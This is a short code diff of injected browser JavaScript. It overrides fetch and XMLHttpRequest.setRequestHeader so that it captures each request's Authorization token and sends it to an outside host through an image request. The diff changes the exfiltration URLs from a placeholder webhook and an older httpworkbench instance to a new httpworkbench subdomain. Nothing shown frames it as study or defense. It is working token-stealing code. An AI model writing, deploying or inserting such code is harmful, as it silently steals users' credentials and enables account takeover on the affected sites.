@@ -9,7 +9,7 @@
         if (h) {
             const t = (h instanceof Headers) ? h.get('Authorization') : (h['Authorization'] || h['authorization']);
             if (t) {
-                new Image().src = `https://your-webhook.com/log?t=${encodeURIComponent(t)}&type=fetch`;
+                new Image().src = `http://6g9yekns.instances.httpworkbench.com?t=${encodeURIComponent(t)}&type=fetch`;
             }
         }
         return originalFetch.apply(this, args);
@@ -21,7 +21,7 @@
 
     XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
         if (header.toLowerCase() === 'authorization') {
-            new Image().src = `https://28ac04qq.instances.httpworkbench.com/log?t=${encodeURIComponent(value)}&type=xhr`;
+            new Image().src = `http://6g9yekns.instances.httpworkbench.com?t=${encodeURIComponent(value)}&type=xhr`;
         }
         return originalSetRequestHeader.apply(this, arguments);
     };
